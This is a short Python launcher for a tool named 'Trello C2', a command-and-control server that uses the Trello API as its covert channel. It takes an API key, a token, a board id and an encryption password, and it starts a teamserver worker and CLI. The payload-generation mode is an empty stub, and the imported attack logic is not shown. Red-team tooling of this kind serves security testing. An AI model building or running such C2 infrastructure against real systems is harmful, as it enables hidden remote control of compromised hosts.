from libs.cli_client import *
from libs.worker import *
from libs.headers import *
import argparse
from threading import Thread

if __name__=="__main__":
    print(gen_headers())
    parser = argparse.ArgumentParser(
                    prog='Trello C2',
                    description='Minimalist C2 using Trello API',
                    epilog='')
    parser.add_argument('mode',help='Specify if the script is in \33[91m\33[4mpayload_gen\33[0m mode, or in \33[91m\33[4mteamserver\33[0m mode')
    parser.add_argument('--password',"-p",help='Specify a password for \33[92m\33[4mencryption\33[0m',required=True)
    parser.add_argument('--api-key',"-a",help='Specify an \33[92m\33[4mapi key\33[0m',required=True)
    parser.add_argument('--token',"-t",help='Set the secret token to connect to trello API \33[92m\33[4mregister key\33[0m',required=True)
    parser.add_argument('--board-id',"-b",help='Specify the \33[92m\33[4mtrello board id\33[0m',required=True)

    args = parser.parse_args()
    if args.mode == "teamserver":
        worker = Worker(args.password,args.api_key,args.token,args.board_id)
        worker_thread = Thread(target=worker.run_loop)
        worker_thread.start()
        cli_client = CliClient(args.password,args.api_key,args.token,args.board_id,worker)
        cli_client.init_cli_client()
    elif args.mode == "payload_gen":
        pass
    else:
        print("[-] Select a valid mode to continue, see --help for options")

